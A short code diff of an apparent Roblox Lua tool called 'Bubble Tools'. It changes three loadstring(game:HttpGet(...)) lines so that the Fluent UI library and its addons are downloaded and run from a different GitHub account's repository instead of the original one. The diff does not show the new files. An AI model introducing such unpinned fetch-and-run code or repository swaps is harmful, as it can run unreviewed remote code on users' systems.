@@ -1543,7 +1543,7 @@ local REDEEM_CODES = {
 }
 
 local okFluent, Fluent = pcall(function()
-    return loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+    return loadstring(game:HttpGet("https://raw.githubusercontent.com/FOGOTY/fluent/refs/heads/main/main"))()
 end)
 if not okFluent then
     error("Bubble Tools: unable to load Fluent UI: " .. tostring(Fluent))
@@ -1552,8 +1552,8 @@ end
 local SaveManager
 local InterfaceManager
 pcall(function()
-    SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
-    InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+    SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/FOGOTY/fluent/refs/heads/main/settings"))()
+    InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/FOGOTY/fluent/refs/heads/main/manager"))()
 end)
 
 local Window = Fluent:CreateWindow({
